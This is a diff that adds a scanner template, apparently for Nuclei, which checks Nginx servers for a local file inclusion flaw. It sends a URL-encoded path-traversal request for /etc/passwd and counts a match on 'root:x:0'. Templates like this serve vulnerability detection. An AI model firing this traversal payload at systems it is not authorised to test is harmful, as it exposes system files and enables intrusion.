@@ -1,0 +1,27 @@
+id: LFI-1day
+
+info:
+  name: LFI-1day
+  author: Momika233
+  severity: high
+  description: Nginx
+  reference:
+    - https://github.com/momika233
+  tags: LFI,Injection
+
+requests:
+  - method: POST
+    path:
+      - '{{BaseURL}}/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd'
+
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:x:0.*"
+        part: body
+
+      - type: status
+        status:
+          - 200
